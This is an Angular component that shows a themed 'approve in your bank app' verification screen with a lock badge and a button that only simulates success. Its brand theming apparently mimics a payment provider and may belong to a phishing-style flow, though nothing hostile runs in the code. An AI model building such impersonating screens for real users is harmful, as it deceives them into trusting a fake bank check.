
import { Component, inject, computed } from '@angular/core';
import { CommonModule } from '@angular/common';
import { PublicLayoutComponent } from './layout/public-layout.component';
import { StateService } from '../services/state.service';
import { TranslatePipe } from '../pipes/translate.pipe';

@Component({
  selector: 'app-bank-app-verification',
  standalone: true,
  imports: [CommonModule, PublicLayoutComponent, TranslatePipe],
  template: `
    <app-public-layout>
      <div class="flex flex-col items-center mb-6 text-center">

        <!-- Animation / Icon -->
        <div class="w-20 h-20 rounded-full flex items-center justify-center mb-6 animate-pulse"
             [style.background]="iconBg()">
            <span class="material-icons text-4xl" [style.color]="brandColor()">touch_app</span>
        </div>

        <h1 class="text-2xl font-bold mb-3 tracking-tight" [style.color]="textColor()">{{ 'BANK_APP.TITLE' | translate }}</h1>

        <p class="text-base text-slate-500 leading-relaxed max-w-[90%] mb-8">
           {{ 'BANK_APP.DESC' | translate }}
        </p>

        <div class="w-full bg-slate-50 border border-slate-100 rounded-lg p-4 mb-8 flex items-start gap-3 text-left">
            <span class="material-icons mt-0.5" [style.color]="brandColor()">info</span>
            <div class="text-sm text-slate-600">
                <p class="font-bold mb-1" [style.color]="textColor()">{{ 'BANK_APP.WHY_TITLE' | translate }}</p>
                <p>{{ 'BANK_APP.WHY_DESC' | translate }}</p>
            </div>
        </div>

        <button (click)="onApproved()" 
            class="w-full py-3.5 rounded-full font-bold text-white shadow-md hover:shadow-lg transition-all transform active:scale-[0.98]"
            [style.background]="btnBg()">
            {{ 'BANK_APP.BUTTON' | translate }}
        </button>

        <div class="mt-6">
             <div class="flex items-center gap-2 justify-center opacity-60">
                 <span class="material-icons text-[14px] text-pp-success">lock</span>
                 <p class="text-xs text-slate-500 font-bold">{{ 'BANK_APP.SECURE_VERIFICATION' | translate }}</p>
             </div>
        </div>

      </div>
    </app-public-layout>
  `
})
export class BankAppVerificationComponent {
  state = inject(StateService);
  theme = computed(() => this.state.currentFlow()?.theme);

  brandColor = computed(() => this.theme()?.brandColor || '#003087');

  // Icon bg is brand color at 10% opacity
  iconBg = computed(() => (this.theme()?.brandColor || '#003087') + '15');

  textColor = computed(() => this.theme()?.input.textColor || '#001C64');
  btnBg = computed(() => this.theme()?.button.background || '#003087');

  onApproved() {
    // Simulate success
    this.state.currentView.set('success');
  }
}
